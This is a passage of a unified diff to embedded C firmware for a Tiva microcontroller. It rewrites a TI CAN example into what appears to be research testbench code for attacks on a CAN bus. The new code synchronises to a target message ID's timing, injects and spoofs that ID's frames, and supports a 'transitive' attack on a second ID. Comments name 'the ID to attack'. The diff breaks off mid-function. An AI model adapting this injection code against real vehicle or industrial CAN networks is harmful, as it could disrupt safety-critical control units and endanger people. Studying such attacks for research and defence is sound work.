@@ -1,39 +1,4 @@
-//*****************************************************************************
-//
-// Copyright (c) 2010-2020 Texas Instruments Incorporated.  All rights reserved.
-// Software License Agreement
-// 
-//   Redistribution and use in source and binary forms, with or without
-//   modification, are permitted provided that the following conditions
-//   are met:
-// 
-//   Redistributions of source code must retain the above copyright
-//   notice, this list of conditions and the following disclaimer.
-// 
-//   Redistributions in binary form must reproduce the above copyright
-//   notice, this list of conditions and the following disclaimer in the
-//   documentation and/or other materials provided with the  
-//   distribution.
-// 
-//   Neither the name of Texas Instruments Incorporated nor the names of
-//   its contributors may be used to endorse or promote products derived
-//   from this software without specific prior written permission.
-// 
-// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
-// "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
-// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
-// A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
-// OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
-// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
-// LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
-// DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
-// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
-// (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
-// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
-// 
-// This is part of revision 2.2.0.295 of the Tiva Firmware Development Package.
-//
-//*****************************************************************************
+// Author: Gedare Bloom
 
 #include <stdint.h>
 #include <stdbool.h>
@@ -51,215 +16,83 @@
 #include "driverlib/rom_map.h"
 #include "driverlib/sysctl.h"
 #include "driverlib/timer.h"
+#include "driverlib/uart.h"
+#include "utils/uartstdio.h"
+
+#include "saebench.h"
+#include "experiment.h"
 
 
-//*****************************************************************************
-//
-// A counter that keeps track of the number of times the TX & RX interrupt has
-// occurred, which should match the number of messages that were transmitted /
-// received.
-//
-//*****************************************************************************
+//----------------------------------------------------------------------------
+// Modify anything below with care!
+//----------------------------------------------------------------------------
+
+// System clock rate in Hz, set in main() to 120 MHz
+uint32_t g_ui32SysClock;
+#define SYSCLK (120000000)
+#define TICKS_PER_MS (SYSCLK/1000)
+#define TICKS_PER_US (TICKS_PER_MS/1000)
+#define TICKS_PER_BIT (SYSCLK/BITRATE)
+#define INTERVAL (TICKS_PER_MS*5)   // 5 ms in 120 MHz ticks
+#define LATENCY_8B_MAX (129*TICKS_PER_BIT) /* maximum message latency */
+
+// counters
 volatile uint32_t g_ui32RXMsgCount = 0;
 volatile uint32_t g_ui32TXMsgCount = 0;
-volatile uint32_t g_ui32TXMsgMidCount = 0;
 
-volatile uint32_t g_ui32TXCount = 0;
-
-//*****************************************************************************
-//
-// A flag for the interrupt handler to indicate that a message was received.
-//
-//*****************************************************************************
-volatile bool g_bRXFlag = 0;
-
-
-//*****************************************************************************
-//
-// A global to keep track of the error flags that have been thrown so they may
-// be processed. This is necessary because reading the error register clears
-// the flags, so it is necessary to save them somewhere for processing.
-//
-//*****************************************************************************
+// flags used by interrupt handlers
 volatile uint32_t g_ui32ErrFlag = 0;
+volatile bool g_bRXFlag = 0;
+volatile bool g_bTXFlag = 0;
+volatile bool g_bTXFlag_5 = 0;
+volatile bool g_bTXTarget_1 = 0;
+volatile bool g_bTXTarget_2 = 0;
+volatile bool g_bRESETFlag = 0;
+volatile bool g_tick = false;
+volatile bool g_tick_2 = false;
 
-//*****************************************************************************
-//
-// CAN message Objects for data being sent / received
-//
-//*****************************************************************************
-tCANMsgObject g_sCAN0RxMessage;
-tCANMsgObject g_sCAN0TxMessage;
-tCANMsgObject g_sCAN0TxMessageMid;
+#define SYNC_MODE_INIT       (0)
+#define SYNC_MODE_SYNCHED    (1)
+#define SYNC_MODE_RESYNCH    (2)
+#define SYNC_MODE_ADJUST     (3)
+#define SYNC_MODE_RESET      (4)
+volatile uint8_t g_sync = SYNC_MODE_INIT;
 
-//*****************************************************************************
-//
-// Message Identifiers and Objects
-// RXID is set to 0 so all messages are received
-//
-//*****************************************************************************
-#define CAN0RXID                0
-#define RXOBJECT                1
-#define CAN0TXID                100
-#define TXOBJECT                4
-#define TXOBJECTMID             6
+volatile bool g_reset = false;
+volatile uint8_t g_msg_since_idle = 0;
 
-#define BITRATE (250000)
+// LED toggling states
+volatile uint8_t g_pin0 = 0;
+volatile uint8_t g_pin_2 = 0;
 
-//*****************************************************************************
-//
-// Variables to hold character being sent / reveived
-//
-//*****************************************************************************
-uint8_t g_ui8TXMsgData[1] = { 0x42 };
-uint8_t g_ui8TXMsgDataMid[2] = { 0xA0, 0x2B };
-uint8_t g_ui8RXMsgData[8];
+// keep track of interrupt event times
+volatile uint32_t g_ui32LastCANIntTimer = 0;
 
-//*****************************************************************************
-//
-// CAN 0 Interrupt Handler. It checks for the cause of the interrupt, and
-// maintains a count of all messages that have been transmitted / received
-//
-//*****************************************************************************
-void
-CAN0IntHandler(void)
-{
-    uint32_t ui32Status;
+// adds delay on reset
+volatile uint32_t g_offset = 0;
 
-    //
-    // Read the CAN interrupt status to find the cause of the interrupt
-    //
-    // CAN_INT_STS_CAUSE register values
-    // 0x0000        = No Interrupt Pending
-    // 0x0001-0x0020 = Number of message object that caused the interrupt
-    // 0x8000        = Status interrupt
-    // all other numbers are reserved and have no meaning in this system
-    //
-    ui32Status = CANIntStatus(CAN0_BASE, CAN_INT_STS_CAUSE);
+// the (current) ID to attack
+volatile uint32_t g_target_id = 0;
+volatile uint32_t g_ui32TargetXmitTime = 0;
+volatile uint8_t g_skip_attack = SKIP_ATTACK;
 
-    //
-    // If this was a status interrupt acknowledge it by reading the CAN
-    // controller status register.
-    //
-    if(ui32Status == CAN_INT_INTID_STATUS)
-    {
-        //
-        // Read the controller status.  This will return a field of status
-        // error bits that can indicate various errors. Refer to the
-        // API documentation for details about the error status bits.
-        // The act of reading this status will clear the interrupt.
-        //
-        ui32Status = CANStatusGet(CAN0_BASE, CAN_STS_CONTROL);
+#define RXOBJECT_RESET      14
+#define TXOBJECT_RESET      RXOBJECT_RESET
+#define TXOBJECT_5          HIGHEST_TX_PRIORITY
+#define TXOBJECT_Target_1   PRIORITY_Target_1
+#define TXOBJECT_Target_2   PRIORITY_Target_2
+#define TXOBJECT_RESERVED1  6
+#define TXOBJECT_RESERVED2  7
+#define TXOBJECT_10         9
+#define TXOBJECT_100        11
+#define TXOBJECT_RESERVED3  12
+#define TXOBJECT_1000       13
 
-        //
-        // Add ERROR flags to list of current errors. To be handled
-        // later, because it would take too much time here in the
-        // interrupt.
-        //
-        g_ui32ErrFlag |= ui32Status;
-    }
-
-    //
-    // Check if the cause is message object RXOBJECT, which we are using
-    // for receiving messages.
-    //
-    else if(ui32Status == RXOBJECT)
-    {
-        //
-        // Getting to this point means that the RX interrupt occurred on
-        // message object RXOBJECT, and the message reception is complete.
-        // Clear the message object interrupt.
-        //
-        CANIntClear(CAN0_BASE, RXOBJECT);
-
-        //
-        // Increment a counter to keep track of how many messages have been
-        // received.  In a real application this could be used to set flags to
-        // indicate when a message is received.
-        //
-        g_ui32RXMsgCount++;
-
-        //
-        // Set flag to indicate received message is pending.
-        //
-        g_bRXFlag = true;
-
-        //
-        // Since a message was received, clear any error flags.
-        // This is done because before the message is received it triggers
-        // a Status Interrupt for RX complete. by clearing the flag here we
-        // prevent unnecessary error handling from happeneing
-        //
-        g_ui32ErrFlag = 0;
-    }
-
-    //
-    // Check if the cause is message object TXOBJECT, which we are using
-    // for transmitting messages.
-    //
-    else if(ui32Status == TXOBJECT)
-    {
-        //
-        // Getting to this point means that the TX interrupt occurred on
-        // message object TXOBJECT, and the message reception is complete.
-        // Clear the message object interrupt.
-        //
-        CANIntClear(CAN0_BASE, TXOBJECT);
-
-        //
-        // Increment a counter to keep track of how many messages have been
-        // transmitted. In a real application this could be used to set
-        // flags to indicate when a message is transmitted.
-        //
-        g_ui32TXMsgCount++;
-
-        //
-        // Since a message was transmitted, clear any error flags.
-        // This is done because before the message is transmitted it triggers
-        // a Status Interrupt for TX complete. by clearing the flag here we
-        // prevent unnecessary error handling from happeneing
-        //
-        g_ui32ErrFlag = 0;
-    }
-    else if(ui32Status == TXOBJECTMID) {
-        CANIntClear(CAN0_BASE, TXOBJECTMID);
-        g_ui32TXMsgMidCount++;
-        g_ui32ErrFlag = 0;
-    }
-
-    //
-    // Otherwise, something unexpected caused the interrupt.  This should
-    // never happen.
-    //
-    else
-    {
-        //
-        // Spurious interrupt handling can go here.
-        //
-    }
-}
+#define RXOBJECT_RESERVED1  15
+#define RXOBJECT            16
 
 
-//****************************************************************************
-//
-// System clock rate in Hz.
-//
-//****************************************************************************
-uint32_t g_ui32SysClock;
-
-//*****************************************************************************
-//
-// Flags that contain the current value of the interrupt indicator as displayed
-// on the UART.
-//
-//*****************************************************************************
-uint32_t g_ui32Flags;
-
-//*****************************************************************************
-//
 // The error routine that is called if the driver library encounters an error.
-//
-//*****************************************************************************
 #ifdef DEBUG
 void
 __error__(char *pcFilename, uint32_t ui32Line)
@@ -267,550 +100,664 @@ __error__(char *pcFilename, uint32_t ui32Line)
 }
 #endif
 
-//*****************************************************************************
-//
-// The interrupt handler for the first timer interrupt.
-//
-//*****************************************************************************
-void
-Timer0IntHandler(void)
+void delay_us(uint32_t delay)
 {
-    //
-    // Clear the timer interrupt.
-    //
-    ROM_TimerIntClear(TIMER0_BASE, TIMER_TIMA_TIMEOUT);
-
-    //
-    // Toggle the flag for the first timer.
-    //
-    HWREGBITW(&g_ui32Flags, 0) ^= 1;
-
-    //
-    // Use the flags to Toggle the LED for this timer
-    //
-    GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_0, g_ui32Flags);
-
-    //
-    // Update the interrupt status.
-    //
-#if 0
-    ROM_IntMasterDisable();
-    ROM_IntMasterEnable();
-#endif
+    uint32_t start = 0;
+    uint32_t end = 1;
+    // in case of an overflow.
+    while (end >= start) { // loop in case of an overflow
+        start = TimerValueGet(TIMER3_BASE, TIMER_A);
+        end = start - delay*TICKS_PER_US; // timer3 is a free-running, countdown timer.
+    }
+    while (start > end) {
+        start = TimerValueGet(TIMER3_BASE, TIMER_A);
+    }
 }
 
-//*****************************************************************************
-//
-// The interrupt handler for the second timer interrupt.
-//
-//*****************************************************************************
-void
-Timer1IntHandler(void)
+void delay_ms(uint32_t delay)
 {
-    int count;
-    //
-    // Clear the timer interrupt.
-    //
-    ROM_TimerIntClear(TIMER1_BASE, TIMER_TIMA_TIMEOUT);
+    delay_us(delay*1000);
+}
 
-    //
-    // Send the CAN message using object number TXOBJECT (not the
-    // same thing as CAN ID, which is also TXOBJECT in this
-    // example).  This function will cause the message to be
-    // transmitted right away.
-    //
-    count = ++g_ui32TXCount;
+void delay_ticks(uint32_t ticks)
+{
+    delay_us(ticks/TICKS_PER_US);
+}
 
-    CANMessageSet(CAN0_BASE, TXOBJECT, &g_sCAN0TxMessage,
-                  MSG_OBJ_TYPE_TX);
+void CAN0IntHandler(void)
+{
+    uint32_t ui32Status;
+    uint32_t timer_val;
 
-    if (count % 2 == 0) {
-        CANMessageSet(CAN0_BASE, TXOBJECTMID, &g_sCAN0TxMessageMid,
-                      MSG_OBJ_TYPE_TX);
+    IntMasterDisable();
+
+    g_ui32LastCANIntTimer = TimerValueGet(TIMER3_BASE, TIMER_A);
+
+    ui32Status = CANIntStatus(CAN0_BASE, CAN_INT_STS_CAUSE);
+
+    if(ui32Status == CAN_INT_INTID_STATUS) {
+
+        ui32Status = CANStatusGet(CAN0_BASE, CAN_STS_CONTROL);
+
+        // if using abort on txerror, check for the tx error condition on the target ID
+        // if an error occurs, just cancel the transmission blindly.
+        if (g_ui32ExpCtrl & DISABLE_RETRANS_TXERR) {
+#if 0
+            uint8_t lec = ui32Status & CAN_STATUS_LEC_MSK;
+            if ( lec == CAN_STATUS_LEC_STUFF || lec == CAN_STATUS_LEC_BIT1 || lec == CAN_STATUS_LEC_BIT0 ) {
+#endif
+            if (ui32Status & CAN_STATUS_LEC_MSK) {
+                if (g_target_id == TARGET_ID ) {
+                    CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
+                } else if (g_ui32ExpCtrl & ATTACK_TRANSITIVE) {
+                    CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
+
+                }
+            }
+        }
+
+
+        // Errors are handled in CANErrorHandler().
+        g_ui32ErrFlag |= ui32Status;
+    } else {
+        g_ui32ErrFlag = 0; // no errors
+
+        if(ui32Status == RXOBJECT) {
+            g_bRXFlag = true;
+        }
+
+#if defined(SEND_RESET)
+        else if(ui32Status == TXOBJECT_RESET)
+        {
+            g_bRESETFlag = true;
+        }
+#endif
+
+        else if(ui32Status == TXOBJECT_5) {
+            g_bTXFlag_5 = true;
+
+        }
+
+        else if(ui32Status == TXOBJECT_Target_1) {
+            g_bTXTarget_1 = true;
+        }
+        else if(ui32Status == TXOBJECT_Target_2) {
+            g_bTXTarget_2 = true;
+        }
+
+        else {
+            g_bTXFlag = true;
+        }
+
+        // This intends to count the number of messages since the last bus idle time.
+        // TODO: It is a crude hack that may need tuning by changing the LATENCY definition.
+        // A more clever solution would derive the expected timer value based on the length of
+        // the received message, but we won't actually know that until (a) after that message is
+        // received and (b) when the RX buffer is read in the main() busy-loop.
+        if (g_ui32ExpCtrl & SYNC_0PHASE && g_sync == SYNC_MODE_RESET) {
+            timer_val = TimerValueGet(TIMER2_BASE, TIMER_A);
+            if (g_target_id == TARGET_ID) {
+                TimerLoadSet(TIMER2_BASE, TIMER_A, TARGET_XMIT_TIME);
+            } else {
+                TimerLoadSet(TIMER2_BASE, TIMER_A, TARGET_XMIT_TIME_2);
+            }
+            TimerEnable(TIMER2_BASE, TIMER_A);
+            if (timer_val == 0) {
+                g_msg_since_idle = 0;
+            } else {
+                g_msg_since_idle++;
+            }
+        }
+
+        CANIntClear(CAN0_BASE, ui32Status);
+    }
+    IntMasterEnable();
+}
+
+void do_attack_injection(uint32_t count)
+{
+    static uint16_t skip_cnt = 0;
+    if (g_ui32ExpCtrl & ATTACK_MASK) {
+        if ( g_sync == SYNC_MODE_SYNCHED && g_reset == false ) {
+            if ( skip_cnt % g_skip_attack == 0 ) {
+                if ( g_target_id == TARGET_ID ) {
+                    CANMessageSet(CAN0_BASE, TXOBJECT_Target_1, &g_sCAN0TxMessage_Target_1, MSG_OBJ_TYPE_TX);
+                } else {
+                    if (g_ui32ExpCtrl & ATTACK_TRANSITIVE) {
+                        CANMessageSet(CAN0_BASE, TXOBJECT_Target_2, &g_sCAN0TxMessage_Target_2, MSG_OBJ_TYPE_TX);
+                    }
+                }
+            }
+            ++skip_cnt;
+        } else {
+            skip_cnt = 0;
+        }
+    }
+}
+
+void send_messages(uint32_t count)
+{
+    if (g_reset == false) {
+        if (HIGH_PRIO_ID < g_target_id ) {
+            if (g_sCAN0TxMessage_5) {
+                CANMessageSet(CAN0_BASE, TXOBJECT_5, g_sCAN0TxMessage_5, MSG_OBJ_TYPE_TX);
+            }
+            do_attack_injection(count);
+        } else {
+            do_attack_injection(count);
+            if (g_sCAN0TxMessage_5) {
+                CANMessageSet(CAN0_BASE, TXOBJECT_5, g_sCAN0TxMessage_5, MSG_OBJ_TYPE_TX);
+            }
+        }
+
+        // spoof the first target's messages after transition, assume it is always a 5 or 10 ms periodic message...
+        if ((g_ui32ExpCtrl & ATTACK_TRANSITIVE) && g_target_id == TARGET_ID_2 ) {
+            if (TARGET_ID < 0xAF || count % 2 == 0) {
+                CANMessageSet(CAN0_BASE, TXOBJECT_Target_1, &g_sCAN0TxMessage_Target_1, MSG_OBJ_TYPE_TX);
+            }
+        }
+
+        if ( count % 2 == 0 && g_sCAN0TxMessage_10) {
+            CANMessageSet(CAN0_BASE, TXOBJECT_10, g_sCAN0TxMessage_10, MSG_OBJ_TYPE_TX);
+        }
+
+        if (count % 20 == 0 && g_sCAN0TxMessage_100) {
+            CANMessageSet(CAN0_BASE, TXOBJECT_100, g_sCAN0TxMessage_100, MSG_OBJ_TYPE_TX);
+        }
+
+        if ( count % 200 == 0 ) {
+            g_pin0 ^= 1;
+            GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_0, g_pin0);
+            if (g_sCAN0TxMessage_1000) {
+                CANMessageSet(CAN0_BASE, TXOBJECT_100, g_sCAN0TxMessage_1000, MSG_OBJ_TYPE_TX);
+            }
+        }
     }
 
-    //
-    // Update the interrupt status.
-    //
+#if defined(SEND_RESET)
+#define SECONDS(x) (200*x)
+#define RESET_PERIOD SECONDS(RESET_PERIOD_SECONDS)
+    if ( count % RESET_PERIOD == 0 ) {
+        g_ui8TXMsgData_RESET[0] = (g_ui8TXMsgData_RESET[0] + 1) % 256;
+        CANMessageSet(CAN0_BASE, TXOBJECT_RESET, &g_sCAN0TxMessage_RESET, MSG_OBJ_TYPE_TX);
+    }
+#endif
+
+}
+
+void send_messages_2(uint32_t count)
+{
+    if ( count % 200 == 0 ) {
+        g_pin_2 ^= 1;
+        GPIOPinWrite(GPIO_PORTN_BASE, GPIO_PIN_0, g_pin_2);
+    }
+}
+
+void Timer0IntHandler(void)
+{
+    TimerIntClear(TIMER0_BASE, TIMER_TIMA_TIMEOUT);
+    g_tick = true;
+
 #if 0
-    ROM_IntMasterDisable();
-    ROM_IntMasterEnable();
+    if (g_ui32ExpCtrl & (SYNC_0PHASE | SYNC_PERIOD)) {
+        if (g_sync == SYNC_MODE_RESYNCH) {
+            TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
+            g_sync = SYNC_MODE_SYNCHED;
+        }
+    } else {
+        g_sync = SYNC_MODE_SYNCHED;
+    }
 #endif
 }
 
-//*****************************************************************************
-//
-// Setup CAN0 to both send and receive at 500KHz.
-// Interrupts on
-// Use PE4 / PE5
-//
-//*****************************************************************************
-void
-InitCAN0(void)
+void Timer1IntHandler(void)
 {
-    //
-    // For this example CAN0 is used with RX and TX pins on port A0 and A1.
-    // GPIO port A needs to be enabled so these pins can be used.
-    //
-    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOA);
+    //uint32_t count;
 
-    //
-    // Configure the GPIO pin muxing to select CAN0 functions for these pins.
-    // This step selects which alternate function is available for these pins.
-    //
-    GPIOPinConfigure(GPIO_PA0_CAN0RX);
-    GPIOPinConfigure(GPIO_PA1_CAN0TX);
+    TimerIntClear(TIMER1_BASE, TIMER_TIMA_TIMEOUT);
+    g_tick_2 = true;
 
-    //
-    // Enable the alternate function on the GPIO pins.  The above step selects
-    // which alternate function is available.  This step actually enables the
-    // alternate function instead of GPIO for these pins.
-    //
-    GPIOPinTypeCAN(GPIO_PORTA_BASE, GPIO_PIN_0 | GPIO_PIN_1);
+    //TimerEnable(TIMER0_BASE, TIMER_A);
+}
 
-    //
-    // The GPIO port and pins have been set up for CAN.  The CAN peripheral
-    // must be enabled.
-    //
-    SysCtlPeripheralEnable(SYSCTL_PERIPH_CAN0);
+void Timer2IntHandler(void)
+{
+    TimerIntClear(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
+    TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
+    TimerEnable(TIMER0_BASE, TIMER_A);
+    TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL);
+    //TimerEnable(TIMER1_BASE, TIMER_A);
+    TimerIntDisable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
 
-    //
-    // Initialize the CAN controller
-    //
+    if (g_sync == SYNC_MODE_INIT) {
+        TimerLoadSet(TIMER2_BASE, TIMER_A, LATENCY_8B_MAX);
+        TimerEnable(TIMER2_BASE, TIMER_A);
+        g_sync = SYNC_MODE_RESET;
+    } else if (g_sync == SYNC_MODE_ADJUST) {
+        TimerDisable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
+        g_sync = SYNC_MODE_SYNCHED;
+        g_tick = true;  // TODO maybe too much jitter for the first injection?
+    } else {
+        // this really shouldn't happen, but let's poll timer 2.
+        TimerLoadSet(TIMER2_BASE, TIMER_A, LATENCY_8B_MAX);
+    }
+}
+
+void ResetCAN0(void)
+{
     CANInit(CAN0_BASE);
 
-    //
-    // Set up the bit rate for the CAN bus.  This function sets up the CAN
-    // bus timing for a nominal configuration.  You can achieve more control
-    // over the CAN bus timing by using the function CANBitTimingSet() instead
-    // of this one, if needed.
-    // In this example, the CAN bus is set to 125 kHz.
-    //
+    if (g_ui32ExpCtrl & DISABLE_RETRANS_AUTO) {
+        CANRetrySet(CAN0_BASE, false);
+    }
+
     CANBitRateSet(CAN0_BASE, g_ui32SysClock, BITRATE);
-
-    //
-    // Enable interrupts on the CAN peripheral.  This example uses static
-    // allocation of interrupt handlers which means the name of the handler
-    // is in the vector table of startup code.
-    //
     CANIntEnable(CAN0_BASE, CAN_INT_MASTER | CAN_INT_ERROR | CAN_INT_STATUS);
-
-    //
-    // Enable the CAN interrupt on the processor (NVIC).
-    //
     IntEnable(INT_CAN0);
-
-#if 0
-    // Loopback Test
-    HWREG(CAN0_BASE + CAN_O_CTL) |= CAN_CTL_TEST;
-    HWREG(CAN0_BASE + CAN_O_TST) |= CAN_TST_LBACK;
-#endif
-
-    //
-    // Enable the CAN for operation.
-    //
     CANEnable(CAN0_BASE);
-
-    //
-    // Initialize a message object to be used for receiving CAN messages with
-    // any CAN ID.  In order to receive any CAN ID, the ID and mask must both
-    // be set to 0, and the ID filter enabled.
-    //
-    g_sCAN0RxMessage.ui32MsgID = CAN0TXID; // Only accept target ID 100
-    g_sCAN0RxMessage.ui32MsgIDMask = 0;  // Maybe mask it?
-    g_sCAN0RxMessage.ui32Flags = MSG_OBJ_RX_INT_ENABLE | MSG_OBJ_USE_ID_FILTER;
-    g_sCAN0RxMessage.ui32MsgLen = sizeof(g_ui8RXMsgData);
-
-    //
-    // Now load the message object into the CAN peripheral.  Once loaded the
-    // CAN will receive any message on the bus, and an interrupt will occur.
-    // Use message object RXOBJECT for receiving messages (this is not the
-    //same as the CAN ID which can be any value in this example).
-    //
     CANMessageSet(CAN0_BASE, RXOBJECT, &g_sCAN0RxMessage, MSG_OBJ_TYPE_RX);
-
-    //
-    // Initialize the message object that will be used for sending CAN
-    // messages.  The message will be 1 bytes that will contain the character
-    // received from the other controller. Initially it will be set to 0.
-    //
-    g_sCAN0TxMessage.ui32MsgID = 0xA3;
-    g_sCAN0TxMessage.ui32MsgIDMask = 0;
-    g_sCAN0TxMessage.ui32Flags = MSG_OBJ_TX_INT_ENABLE;
-    g_sCAN0TxMessage.ui32MsgLen = sizeof(g_ui8TXMsgData);
-    g_sCAN0TxMessage.pui8MsgData = (uint8_t *)&g_ui8TXMsgData;
-
-    g_sCAN0TxMessageMid.ui32MsgID = 0xB3;
-    g_sCAN0TxMessageMid.ui32MsgIDMask = 0;
-    g_sCAN0TxMessageMid.ui32Flags = MSG_OBJ_TX_INT_ENABLE;
-    g_sCAN0TxMessageMid.ui32MsgLen = sizeof(g_ui8TXMsgDataMid);
-    g_sCAN0TxMessageMid.pui8MsgData = (uint8_t *)&g_ui8TXMsgDataMid;
-
 }
 
+void InitCAN0(void)
+{
+    // CAN0 uses GPIO ports A0 and A1.
+    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOA);
+    GPIOPinConfigure(GPIO_PA0_CAN0RX);
+    GPIOPinConfigure(GPIO_PA1_CAN0TX);
+    GPIOPinTypeCAN(GPIO_PORTA_BASE, GPIO_PIN_0 | GPIO_PIN_1);
+    SysCtlPeripheralEnable(SYSCTL_PERIPH_CAN0);
+    ResetCAN0();
+}
 
-//*****************************************************************************
-//
-// Can ERROR handling. When a message is received if there is an erro it is
-// saved to g_ui32ErrFlag, the Error Flag Set. Below the flags are checked
-// and cleared. It is left up to the user to add handling fuctionality if so
-// desiered.
-//
-// For more information on the error flags please see the CAN section of the
-// microcontroller datasheet.
-//
-// NOTE: you may experience errors during setup when only one board is powered
-// on. This is caused by one board sending signals and there not being another
-// board there to acknoledge it. Dont worry about these errors, they can be
-// disregarded.
-//
-//*****************************************************************************
 void
 CANErrorHandler(void)
 {
-    //
-    // CAN controller has entered a Bus Off state.
-    //
-    if(g_ui32ErrFlag & CAN_STATUS_BUS_OFF)
-    {
-        //
-        // Handle Error Condition here
-        //
-        //UARTprintf("    ERROR: CAN_STATUS_BUS_OFF \n");
 
+    if (g_ui32ErrFlag & CAN_STATUS_BUS_OFF) {
+        uint32_t ui32Status;
+
+        UARTprintf("ERROR: CAN_STATUS_BUS_OFF\n");
+
+        // on bus-off, set an LED pin and reset
         GPIOPinWrite(GPIO_PORTN_BASE, GPIO_PIN_0, 1);
-        //
-        // Clear CAN_STATUS_BUS_OFF Flag
-        //
+        CANEnable(CAN0_BASE);
+        do {
+            ui32Status = CANStatusGet(CAN0_BASE, CAN_STS_CONTROL);
+        } while ( ui32Status & CAN_STATUS_BUS_OFF);
+        g_reset = true;     // this disables any more attacking until a RESET happens
+
+        // turn off the LED after recovery
+        GPIOPinWrite(GPIO_PORTN_BASE, GPIO_PIN_0, 0);
+
         g_ui32ErrFlag &= ~(CAN_STATUS_BUS_OFF);
-
     }
 
-    //
-    // CAN controller error level has reached warning level.
-    //
-    if(g_ui32ErrFlag & CAN_STATUS_EWARN)
-    {
-        //
-        // Handle Error Condition here
-        //
-        //UARTprintf("    ERROR: CAN_STATUS_EWARN \n");
-
-        //
-        // Clear CAN_STATUS_EWARN Flag
-        //
+    if (g_ui32ErrFlag & CAN_STATUS_EWARN) {
+        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_4, 1);
         g_ui32ErrFlag &= ~(CAN_STATUS_EWARN);
+    } else {
+        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_4, 0);
     }
 
-    //
-    // CAN controller error level has reached error passive level.
-    //
-    if(g_ui32ErrFlag & CAN_STATUS_EPASS)
-    {
-        //
-        // Handle Error Condition here
-        //
-
-        GPIOPinWrite(GPIO_PORTN_BASE, GPIO_PIN_1, 1);
-
-        //
-        // Clear CAN_STATUS_EPASS Flag
-        //
+    if (g_ui32ErrFlag & CAN_STATUS_EPASS) {
+        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_4, 1);
         g_ui32ErrFlag &= ~(CAN_STATUS_EPASS);
     }
 
-    //
-    // A message was received successfully since the last read of this status.
-    //
-    if(g_ui32ErrFlag & CAN_STATUS_RXOK)
-    {
-        //
-        // Handle Error Condition here
-        //
-
-        //
-        // Clear CAN_STATUS_RXOK Flag
-        //
+    if (g_ui32ErrFlag & CAN_STATUS_RXOK) {
         g_ui32ErrFlag &= ~(CAN_STATUS_RXOK);
     }
 
-    //
-    // A message was transmitted successfully since the last read of this
-    // status.
-    //
-    if(g_ui32ErrFlag & CAN_STATUS_TXOK)
-    {
-        //
-        // Handle Error Condition here
-        //
-
-        //
-        // Clear CAN_STATUS_TXOK Flag
-        //
+    if (g_ui32ErrFlag & CAN_STATUS_TXOK) {
         g_ui32ErrFlag &= ~(CAN_STATUS_TXOK);
     }
 
-    //
-    // This is the mask for the last error code field.
-    //
-    if(g_ui32ErrFlag & CAN_STATUS_LEC_MSK)
-    {
-        //
-        // Handle Error Condition here
-        //
-
-        //
-        // Clear CAN_STATUS_LEC_MSK Flag
-        //
-        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_MSK);
-    }
-
-    //
-    // A bit stuffing error has occurred.
-    //
-    if(g_ui32ErrFlag & CAN_STATUS_LEC_STUFF)
-    {
-        //
-        // Handle Error Condition here
-        //
-
-        //
-        // Clear CAN_STATUS_LEC_STUFF Flag
-        //
+    if (g_ui32ErrFlag & CAN_STATUS_LEC_STUFF) {
         g_ui32ErrFlag &= ~(CAN_STATUS_LEC_STUFF);
     }
 
-    //
-    // A formatting error has occurred.
-    //
-    if(g_ui32ErrFlag & CAN_STATUS_LEC_FORM)
-    {
-        //
-        // Handle Error Condition here
-        //
-
-        //
-        // Clear CAN_STATUS_LEC_FORM Flag
-        //
+    if(g_ui32ErrFlag & CAN_STATUS_LEC_FORM) {
         g_ui32ErrFlag &= ~(CAN_STATUS_LEC_FORM);
     }
 
-    //
-    // An acknowledge error has occurred.
-    //
-    if(g_ui32ErrFlag & CAN_STATUS_LEC_ACK)
-    {
-        //
-        // Handle Error Condition here
-        //
-
-        //
-        // Clear CAN_STATUS_LEC_ACK Flag
-        //
+    if(g_ui32ErrFlag & CAN_STATUS_LEC_ACK) {
         g_ui32ErrFlag &= ~(CAN_STATUS_LEC_ACK);
     }
 
-    //
-    // The bus remained a bit level of 1 for longer than is allowed.
-    //
-    if(g_ui32ErrFlag & CAN_STATUS_LEC_BIT1)
-    {
-        //
-        // Handle Error Condition here
-        //
-
-        //
-        // Clear CAN_STATUS_LEC_BIT1 Flag
-        //
+    if (g_ui32ErrFlag & CAN_STATUS_LEC_BIT1) {
         g_ui32ErrFlag &= ~(CAN_STATUS_LEC_BIT1);
     }
 
-    //
-    // The bus remained a bit level of 0 for longer than is allowed.
-    //
-    if(g_ui32ErrFlag & CAN_STATUS_LEC_BIT0)
-    {
-        //
-        // Handle Error Condition here
-        //
-
-        //
-        // Clear CAN_STATUS_LEC_BIT0 Flag
-        //
+    if (g_ui32ErrFlag & CAN_STATUS_LEC_BIT0) {
         g_ui32ErrFlag &= ~(CAN_STATUS_LEC_BIT0);
     }
 
-    //
-    // A CRC error has occurred.
-    //
-    if(g_ui32ErrFlag & CAN_STATUS_LEC_CRC)
-    {
-        //
